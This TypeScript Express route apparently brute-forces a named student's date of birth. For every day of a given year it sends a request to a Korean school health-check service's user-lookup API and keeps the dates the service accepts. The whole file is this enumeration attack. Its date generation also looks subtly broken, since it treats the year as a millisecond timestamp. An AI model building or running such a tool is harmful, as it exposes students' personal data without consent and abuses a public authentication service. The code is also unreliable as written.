import { Router } from 'express';
import axios from 'axios';

import { asyncHandler } from '../middlewares';
import { encryptor } from '../utils';

const router = Router();

const pad2 = (num: Number): string => num.toString().padStart(2, '0');
const formatDate = (date: Date): string => pad2(date.getFullYear() - 2000) + pad2(date.getMonth() + 1) + pad2(date.getDate());
const checkBirthday = async ({
    name,
    date,
    schoolCode,
}: {
    name: string,
    date: string,
    schoolCode: string,
}): Promise<string | false> => {
    try {
        await axios.post(
            "https://goehcs.eduro.go.kr/v2/findUser",
            {
                "orgCode": schoolCode,
                "name": encryptor.encrypt(name),
                "birthday": encryptor.encrypt(date),
                "stdntPNo": null,
                "loginType": "school",
            },
        )
        return date;
    } catch {
        return false;
    }
};

const getBirthday = async({
    name,
    schoolCode,
    year,
}: {
    name: string,
    schoolCode: string,
    year: number,
}): Promise<string[]> => {
    const baseDate = Number(new Date(year));
    const result: string[] = (
        await Promise.all(
            [...Array(year % 4 ? 365 : 366)]
                .map((_, i) => formatDate(new Date(baseDate + 60 * 60 * 24 * 1000 * i)))
                .map(date => checkBirthday({ name, date, schoolCode }))
        )
    ).filter(Boolean) as string[];
    return result;
};

router.post(
    '/',
    asyncHandler(async (req, res) => {
        const { name, schoolCode, year } = req.body;

        if (isNaN(Number(year))) throw new Error("invalid year");

        const birthday = await getBirthday({name, schoolCode, year});
        if (!birthday.length) throw new Error("birthday not found");
        res.json({birthday});
        console.log(birthday);
        return;
    }),
);

export default router;